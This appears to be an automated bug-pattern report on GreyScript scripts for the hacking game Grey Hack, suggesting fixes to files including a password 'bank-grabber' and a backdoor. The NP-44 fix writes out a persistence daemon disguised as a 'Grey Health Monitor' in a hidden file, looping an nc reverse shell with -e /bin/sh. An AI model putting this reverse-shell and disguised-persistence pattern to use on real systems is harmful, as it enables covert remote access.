# GreyScript Bug Patterns — 2026-06-17 Round 5 (Scan 4)

New patterns from automated scan of files 61–70 (batch starting at index 60).
All files in this batch were backup copies — duplicate findings confirm known patterns.

## NP-42: touch() → File() Return Value Misinterpretation

**Severity:** HIGH — When touched file is actually present, the check passes a wrong value

```grey
# BEFORE (alias-cli/alias.src:44-49) — broken return check:
ok = pc.touch(self.path, self.name)
if ok != 1 then      // ← WRONG: touch() returns "" on success, not 1
    print ok         //   This branch triggers even on success!
    return -1
end if
f = pc.File(self.path + "/" + self.name)  // ← may work but the logic above is wrong

# AFTER (correct):
ok = pc.touch(self.path, self.name)
// touch returns "" on success, null on failure
if ok == null then
    print "touch failed"
    return -1
end if
f = pc.File(self.path + "/" + self.name)
if not f then
    print "File not found after touch"
    return -1
end if
```

**Why it's subtle:** In GreyScript, `pc.touch()` returns an empty string `""` on success (truthy), not `1`. A check like `if ok != 1` will be true even on success, causing a false failure.

**Related:** This is similar to NP-04 (wrong delete/touch return checks). The correct pattern is:
- `touch()` → check `== null` (failure) or `!= null` (success), NOT `== 1`
- `delete()` → check `== ""` (success), NOT `== 1`

---

## NP-43: Insufficient Input Validation on split() Results

**Severity:** HIGH — Crash on malformed input

```grey
# BEFORE (bank-grabber/draft_script.src:49-51):
pass = content.split(":")
if pass.len < 2 then continue
final = GetPassword(pass)   // calls pass[1] without checking pass[1] is non-empty

# AFTER (safe):
pass = content.split(":")
if pass.len < 2 then continue
if pass[0] == "" or pass[1] == "" then continue  // empty user or password
final = GetPassword(pass)
```

**Pattern:** `pass.len < 2` guards against missing delimiter, but `":"` splits to `["", ""]` (len=2). Empty fields pass the check.

---

## NP-44: Daemon Script Built via String Concatenation

**Severity:** MEDIUM — O(n²) copies, hard to maintain

```grey
# BEFORE (backdoor.src:162-173):
daemonScript = "#!/bin/sh\n"
daemonScript = daemonScript + "# Grey Health Monitor\n"
daemonScript = daemonScript + "while true; do\n"
// ... 5 more concatenations

# AFTER (use list + join):
lines = [
    "#!/bin/sh",
    "# Grey Health Monitor",
    "while true; do",
    "  nc " + localIP + " " + reversePort + " -e /bin/sh 2>/dev/null",
    "  sleep 120",
    "done",
    ""
]
daemonScript = lines.join(char(10))
```

Also co-occurs with **NP-23** (hardcoded reversePort = 4444). The daemon path itself (`/bin/.grey_health.sh`) is also hardcoded.

---

## Findings Summary

| ID | Pattern | Severity | Files | Duplicates? |
|----|---------|----------|-------|-------------|
| NP-42 | touch() return misinterpreted | HIGH | alias-cli/alias.src:44 | Yes (backup) |
| NP-43 | Empty field after split | HIGH | bank-grabber/draft_script.src:51 | Yes (backup) |
| NP-44 | String concat for multi-line script | MEDIUM | backdoor.src:162-173 | Yes (backup) |
| — | Hardcoded port (NP-23) | LOW | backdoor.src:154 | Yes (backup) |
| — | Hardcoded URLs (NP-23) | LOW | bootstrap.src:14-15 | Yes (backup) |
| — | Missing null-check on overflow (NP-35) | MEDIUM | auto_exploit.src:203 | Yes (backup) |

**Note:** All files in this batch were backup copies. No new unique bugs were found — only confirmations of known patterns in NP-23, NP-33, NP-35, NP-42, NP-43, NP-44.
